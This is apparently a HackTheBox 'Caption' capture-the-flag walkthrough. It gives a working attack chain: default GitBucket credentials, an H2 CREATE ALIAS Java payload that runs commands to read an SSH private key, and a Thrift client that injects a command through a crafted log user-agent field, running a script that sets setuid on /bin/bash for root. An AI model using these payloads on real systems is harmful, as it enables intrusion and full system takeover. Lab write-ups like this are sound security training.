d1, Recon
port scan 
	22/tcp ssh
	80/tcp http `redirect to http://caption.htb`
	8080/tcp http-proxy
By enumerate the web-contents, we find something interesting:
for port 80, there is only the `Caption Portal Login` page, but we don't have any credit.
for port 8080, we find a path `/root` we can find its role in `GitBucket`, but we could not find anything from that.
![](images/Pasted%20image%2020240915034953.png)

Besides that ,we still don't have any credit to login.

So crazy, when I try to use the default credit `root:root`, we successfully login.
Then we can find two repositories `root/Logservice` and `root/Caption-Portal` and we need to enumerate all the configs and find some useful credit.

I guess there would be another sub-domain for the service `Logservice`.
Very sad, there is nothing useful.

From `User management`, we find the version 
```
|GITBUCKET_VERSION|4.40.0|
|GITBUCKET_HOME|/home/margo/.gitbucket|
|DATABASE_URL|jdbc:h2:/home/margo/.gitbucket/data;MVCC=true<br><br>GitBucket is using the embedded H2 database. It's recommended that you [configure GitBucket to use an external database](https://github.com/gitbucket/gitbucket/wiki/External-database-configuration) if you're running GitBucket in a production environment.|
```
And we find another interesting page `http://caption.htb:8080/admin/dbviewer`
We can check the database from this page.
```
|USER_NAME|MAIL_ADDRESS|PASSWORD|ADMINISTRATOR|URL|REGISTERED_DATE|UPDATED_DATE|LAST_LOGIN_DATE|IMAGE|GROUP_ACCOUNT|FULL_NAME|REMOVED|DESCRIPTION|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|root|root@caption.htb|$pbkdf2-sha256$100000$O5zdxA5m9ZtnSSMnUfXK4zw9j/8WgKxo9ItXxVIPw3s=$xUd/Zorr75r/yWR9IXkW7TJlLXuEH+3U1uMAm37cBMk=|true|http://caption.htb|2024-03-08 03:01:05.0|2024-03-08 04:16:07.215|2024-09-15 07:54:33.255|<NULL>|false|Administrator|false|clob1: 'Caption Networks'|


|gitbucket-core|4.40.0|
|gist|4.23.0|
|emoji|4.6.0|
|notifications|1.11.0|
|pages|1.10.0|
```

So I guess it would be our credit hash
`$pbkdf2-sha256$100000$O5zdxA5m9ZtnSSMnUfXK4zw9j/8WgKxo9ItXxVIPw3s=$xUd/Zorr75r/yWR9IXkW7TJlLXuEH+3U1uMAm37cBMk=`
Or it would be just `root:root`

But come to the `DATABASE_URL`, we find h2 database.This kind of database would be always exploited easily by sql injections.

Then we can create the valid payload to help us to RCE
(Good resource: `https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/') 

```
CREATE ALIAS REVEXEC AS $$ 
String shellexec(String cmd) throws java.io.IOException { 
    java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(cmd).getInputStream()
    ).useDelimiter("\\A"); 
    return s.hasNext() ? s.next() : ""; 
} 
$$;

CALL REVEXEC('cat /home/margo/.ssh/id_ecdsa ');

Then we can get our id_rsa (ssh credit).
```

2, shell as root
Firstly we need to check the net state(verify the applications in gitbucket)
```
netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1310/java           
tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN      1311/python3        
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1312/python3        
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

`127.0.0.1:8000` is the `[Caption-Portal]` application
`127.0.0.1:9090` is the `[Logservice]` application

```
- func main() {
-     handler := &LogServiceHandler{}
-     processor := log_service.NewLogServiceProcessor(handler)
-     transport, err := thrift.NewTServerSocket(":9090")
-     if err != nil {
-         log.Fatalf("Error creating transport: %v", err)
-     }

-     server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
-     log.Println("Starting the server...")
-     if err := server.Serve(); err != nil {
-         log.Fatalf("Error occurred while serving: %v", err)
-     }
- }
```

So if we want to check it, we need to Port forwarding
`ssh -i id_rsa margo@10.10.11.33 -L 9090:localhost:9090`

I forget this is a log analysis service, and don't have the web pages.

Let's continue checking the `app/app.py` and we found the credit of margo and admin
```
username == 'margo' and password == 'vFr&cS2#0!'
username == 'admin' and password == 'cFgjE@0%l0'
```
Although we use them to login to the service of port 80, but there is still nothing for us and we can not check `sudo -l` or switch to another user `ruth`

The way to root is using thrift client and leverage the LogService rce:
(https://thrift.apache.org/tutorial/py.html)
Steps:
1.Setup port forwarding:
`ssh -i id_ecdsa -L 9090:127.0.0.1:9090 margo@caption.htb`

2.Now on the remote machine:
Create a file called: `/tmp/malicious.log`
Edit file to include: 
`127.0.0.1 "user-agent":"'; /bin/bash /tmp/payload.sh #"`

Create another file: `/tmp/payload.sh`
Edit file to include: `chmod +s /bin/bash`

3.Switch to local machine:
create a file called: `log_service.thrift`
Edit file to include:
```
namespace go log_service

service LogService {
    string ReadLogFile(1: string filePath)
}
```

Make sure thrift is installed and run: `thrift -r --gen py log_service.thrift`

`cd gen-py`
create file called: `client.py`

edit file with:

```
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Import generated Thrift client code

def main():
    # Set up a transport to the server
    transport = TSocket.TSocket('localhost', 9090)

    # Buffering for performance
    transport = TTransport.TBufferedTransport(transport)

    # Using a binary protocol
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client to use the service
    client = LogService.Client(protocol)

    # Open the connection
    transport.open()

    try:
        # Specify the log file path to process
        log_file_path = "/tmp/malicious.log"
       
        # Call the remote method ReadLogFile and get the result
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)
   
    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")

    # Close the transport
    transport.close()

if __name__ == '__main__':
    main()
```

4.Root shell is then via `/bin/bash -p`.